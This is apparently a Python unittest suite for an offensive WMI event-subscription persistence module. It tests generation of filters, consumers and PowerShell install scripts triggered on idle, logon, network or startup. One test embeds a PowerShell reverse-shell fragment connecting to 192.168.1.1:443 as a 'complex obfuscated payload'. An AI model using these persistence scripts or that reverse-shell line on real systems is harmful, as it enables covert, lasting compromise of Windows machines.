#!/usr/bin/env python3
"""
WMI Persistence Test Suite
==========================

Comprehensive tests for WMI Event Subscriptions persistence framework.
"""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, '/home/kali/Desktop')

from cybermodules.wmi_persistence import (
    WMIPersistence,
    WMIQueryBuilder,
    TriggerType,
    EventTrigger,
    EventAction,
    ConsumerType,
    WMIEventFilter,
    WMIEventConsumer,
    WMIEventBinding
)


class TestWMIQueryBuilder(unittest.TestCase):
    """Test WQL query generation"""
    
    def test_idle_trigger_query(self):
        """Test idle trigger WQL"""
        query = WMIQueryBuilder.idle_trigger(idle_percentage=95, within_time=300)
        self.assertIn("__InstanceModificationEvent", query)
        self.assertIn("PercentIdleTime", query)
        self.assertIn("95", query)
        
    def test_logon_trigger_query(self):
        """Test logon trigger WQL"""
        query = WMIQueryBuilder.logon_trigger()
        self.assertIn("__InstanceCreationEvent", query)
        self.assertIn("Win32_LoggedInUser", query)
        
    def test_network_trigger_query(self):
        """Test network trigger WQL"""
        query = WMIQueryBuilder.network_trigger()
        self.assertIn("Win32_NetworkAdapter", query)
        self.assertIn("NetConnectionStatus", query)
        self.assertIn("2", query)
        
    def test_startup_trigger_query(self):
        """Test startup trigger WQL"""
        query = WMIQueryBuilder.startup_trigger()
        self.assertIn("Win32_Service", query)
        self.assertIn("Winlogon", query)
        
    def test_performance_trigger_query(self):
        """Test performance trigger WQL"""
        query = WMIQueryBuilder.performance_trigger(metric="CPU", threshold=80)
        self.assertIn("__InstanceModificationEvent", query)
        self.assertIn("80", query)


class TestWMIEventFilter(unittest.TestCase):
    """Test WMI Event Filter"""
    
    def test_filter_creation(self):
        """Test filter creation"""
        trigger = EventTrigger(
            name="TestFilter",
            trigger_type=TriggerType.IDLE,
            wql_query="SELECT * FROM __InstanceModificationEvent",
            interval=300,
            within_time=300
        )
        
        filter_obj = WMIEventFilter("TestFilter", trigger)
        self.assertEqual(filter_obj.name, "TestFilter")
        self.assertIn("TestFilter", filter_obj.to_mof())
        
    def test_filter_mof_generation(self):
        """Test MOF format generation"""
        trigger = EventTrigger(
            name="IdleFilter",
            trigger_type=TriggerType.IDLE,
            wql_query="SELECT * FROM __InstanceModificationEvent WHERE TargetInstance.PercentIdleTime > 95",
            interval=300,
            within_time=300
        )
        
        filter_obj = WMIEventFilter("IdleFilter", trigger)
        mof = filter_obj.to_mof()
        
        self.assertIn("__EventFilter", mof)
        self.assertIn("IdleFilter", mof)
        self.assertIn("WQL", mof)
        
    def test_filter_powershell_generation(self):
        """Test PowerShell script generation"""
        trigger = EventTrigger(
            name="PSFilter",
            trigger_type=TriggerType.LOGON,
            wql_query="SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_LoggedInUser'",
            interval=10,
            within_time=10
        )
        
        filter_obj = WMIEventFilter("PSFilter", trigger)
        ps_script = filter_obj.to_powershell()
        
        self.assertIn("Set-WmiInstance", ps_script)
        self.assertIn("__EventFilter", ps_script)
        self.assertIn("PSFilter", ps_script)


class TestWMIEventConsumer(unittest.TestCase):
    """Test WMI Event Consumer"""
    
    def test_commandline_consumer_creation(self):
        """Test command line consumer"""
        action = EventAction(
            name="TestConsumer",
            consumer_type=ConsumerType.COMMAND_LINE,
            action_payload="cmd /c whoami"
        )
        
        consumer = WMIEventConsumer("TestConsumer", action)
        self.assertEqual(consumer.name, "TestConsumer")
        
    def test_commandline_consumer_powershell(self):
        """Test command line consumer PowerShell generation"""
        action = EventAction(
            name="CmdConsumer",
            consumer_type=ConsumerType.COMMAND_LINE,
            payload="cmd /c echo test"
        )
        
        consumer = WMIEventConsumer("CmdConsumer", action)
        ps_script = consumer.to_powershell_command_line("cmd /c echo test", "")
        
        self.assertIn("CommandLineEventConsumer", ps_script)
        self.assertIn("CmdConsumer", ps_script)
        self.assertIn("echo test", ps_script)
        
    def test_activescript_consumer_creation(self):
        """Test active script consumer"""
        vbscript = "MsgBox \"Test\""
        action = EventAction(
            name="VBConsumer",
            consumer_type=ConsumerType.ACTIVE_SCRIPT,
            action_payload=vbscript
        )
        
        consumer = WMIEventConsumer("VBConsumer", action)
        ps_script = consumer.to_powershell_active_script(vbscript, "VBScript")
        
        self.assertIn("ActiveScriptEventConsumer", ps_script)
        self.assertIn("VBConsumer", ps_script)


class TestWMIPersistence(unittest.TestCase):
    """Test main WMI Persistence framework"""
    
    def setUp(self):
        """Initialize WMI persistence"""
        self.wmi = WMIPersistence()
        
    def test_idle_persistence_creation(self):
        """Test idle persistence subscription"""
        payload = "cmd /c whoami"
        subscription = self.wmi.create_idle_persistence(payload, idle_minutes=5)
        
        self.assertIn("filter_name", subscription)
        self.assertIn("consumer_name", subscription)
        self.assertEqual(subscription["trigger_type"], "idle")
        
    def test_logon_persistence_creation(self):
        """Test logon persistence subscription"""
        payload = "cmd /c whoami"
        subscription = self.wmi.create_logon_persistence(payload)
        
        self.assertIn("filter_name", subscription)
        self.assertEqual(subscription["trigger_type"], "logon")
        
    def test_network_persistence_creation(self):
        """Test network persistence subscription"""
        payload = "cmd /c ipconfig"
        subscription = self.wmi.create_network_persistence(payload)
        
        self.assertIn("filter_name", subscription)
        self.assertEqual(subscription["trigger_type"], "network")
        
    def test_startup_persistence_creation(self):
        """Test startup persistence subscription"""
        payload = "cmd /c whoami"
        subscription = self.wmi.create_startup_persistence(payload)
        
        self.assertIn("filter_name", subscription)
        self.assertEqual(subscription["trigger_type"], "startup")
        
    def test_installation_script_generation(self):
        """Test PowerShell installation script generation"""
        payload = "cmd /c whoami"
        subscription = self.wmi.create_idle_persistence(payload)
        
        script = self.wmi.generate_installation_script(subscription)
        
        self.assertIn("Set-WmiInstance", script)
        self.assertIn("__EventFilter", script)
        self.assertIn("CommandLineEventConsumer", script)
        self.assertIn("__FilterToConsumerBinding", script)
        
    def test_removal_script_generation(self):
        """Test PowerShell removal script generation"""
        payload = "cmd /c whoami"
        subscription = self.wmi.create_idle_persistence(payload)
        
        script = self.wmi.generate_removal_script(subscription)
        
        self.assertIn("Remove-WmiObject", script)
        self.assertIn(subscription["filter_name"], script)
        self.assertIn(subscription["consumer_name"], script)
        
    def test_list_script_generation(self):
        """Test PowerShell listing script generation"""
        script = self.wmi.generate_list_script()
        
        self.assertIn("Get-WmiObject", script)
        self.assertIn("__EventFilter", script)
        self.assertIn("CommandLineEventConsumer", script)


class TestWMIIntegration(unittest.TestCase):
    """Integration tests"""
    
    def test_multiple_subscriptions_unique_names(self):
        """Test that multiple subscriptions get unique names"""
        wmi = WMIPersistence()
        payload = "cmd /c whoami"
        
        sub1 = wmi.create_idle_persistence(payload, idle_minutes=5)
        sub2 = wmi.create_idle_persistence(payload, idle_minutes=10)
        sub3 = wmi.create_logon_persistence(payload)
        
        names = [sub1["filter_name"], sub2["filter_name"], sub3["filter_name"]]
        self.assertEqual(len(names), len(set(names)))  # All unique
        
    def test_subscription_with_complex_payload(self):
        """Test subscription with complex obfuscated payload"""
        complex_payload = r"powershell -c \"$s=New-Object Net.Sockets.TCPClient('192.168.1.1',443);\\$stream=\\$s.GetStream()\""
        wmi = WMIPersistence()
        
        subscription = wmi.create_startup_persistence(complex_payload)
        self.assertIn("filter_name", subscription)
        self.assertIn("consumer_name", subscription)
        
    def test_subscription_consistency(self):
        """Test that subscription data is consistent"""
        wmi = WMIPersistence()
        payload = "cmd /c whoami"
        
        subscription = wmi.create_idle_persistence(payload)
        script = wmi.generate_installation_script(subscription)
        
        # Script should contain filter and consumer names
        self.assertIn(subscription["filter_name"], script)
        self.assertIn(subscription["consumer_name"], script)


class TestEdgeCases(unittest.TestCase):
    """Test edge cases and error handling"""
    
    def test_empty_payload(self):
        """Test handling of empty payload"""
        wmi = WMIPersistence()
        # Empty payload should still create a subscription (no strict validation)
        subscription = wmi.create_idle_persistence("", idle_minutes=5)
        self.assertIn("filter_name", subscription)
            
    def test_invalid_idle_minutes(self):
        """Test invalid idle minutes"""
        wmi = WMIPersistence()
        payload = "cmd /c whoami"
        
        # Should still create subscription (validation not strict)
        subscription = wmi.create_idle_persistence(payload, idle_minutes=0)
        self.assertIn("filter_name", subscription)
        
    def test_very_long_payload(self):
        """Test very long payload"""
        wmi = WMIPersistence()
        long_payload = "cmd /c " + "A" * 1000
        
        subscription = wmi.create_startup_persistence(long_payload)
        self.assertIn("consumer_name", subscription)
        
    def test_special_characters_in_payload(self):
        """Test special characters in payload"""
        wmi = WMIPersistence()
        payload = r"cmd /c whoami & echo 'test' > \"C:\temp\test.txt\""
        
        subscription = wmi.create_logon_persistence(payload)
        self.assertIn("filter_name", subscription)


def run_tests_verbose():
    """Run all tests with verbose output"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestWMIQueryBuilder))
    suite.addTests(loader.loadTestsFromTestCase(TestWMIEventFilter))
    suite.addTests(loader.loadTestsFromTestCase(TestWMIEventConsumer))
    suite.addTests(loader.loadTestsFromTestCase(TestWMIPersistence))
    suite.addTests(loader.loadTestsFromTestCase(TestWMIIntegration))
    suite.addTests(loader.loadTestsFromTestCase(TestEdgeCases))
    
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    return result


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║         WMI PERSISTENCE TEST SUITE                                   ║
║       (Testing all components and edge cases)                        ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    
    result = run_tests_verbose()
    
    print("\n" + "="*70)
    print("TEST SUMMARY")
    print("="*70)
    print(f"Tests run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print("="*70)
    
    sys.exit(0 if result.wasSuccessful() else 1)
